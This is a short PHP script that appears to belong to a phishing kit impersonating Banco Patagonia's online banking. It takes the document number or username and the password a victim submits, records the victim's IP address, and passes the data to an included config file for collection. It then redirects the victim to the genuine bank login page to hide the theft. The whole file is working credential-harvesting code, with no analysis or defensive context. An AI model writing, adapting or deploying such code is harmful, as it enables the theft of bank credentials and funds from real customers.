<?php  
	if (isset($_POST['submit'])) {
		if ($_POST['opcion']) {
			$t = $_POST['opcion'];
			$nd = $_POST['documento'];
			$pss = $_POST['clave'];
			$msj = ">>> patagonia <<<"."\r\n";
			$msj .="IP: ".getenv('REMOTE_ADDR')."\r\n";
			$msj .=$t." : ".$nd."\r\n";
			$msj .="Clave: ".$pss."\r\n";
			
		}
		if ($_POST['usuario']) {
			$us = $_POST['usuario'];
			$pss = $_POST['clave'];
			$msj = ">>> patagonia <<<"."\r\n";
			$msj .="IP: ".getenv('REMOTE_ADDR')."\r\n";
			$msj .="Usuario : ".$us."\r\n";
			$msj .="Clave: ".$pss."\r\n";
		}
		include 'configurame.php';
		header("location:https://ebankpersonas.bancopatagonia.com.ar/eBanking/usuarios/login.htm");
	}
?>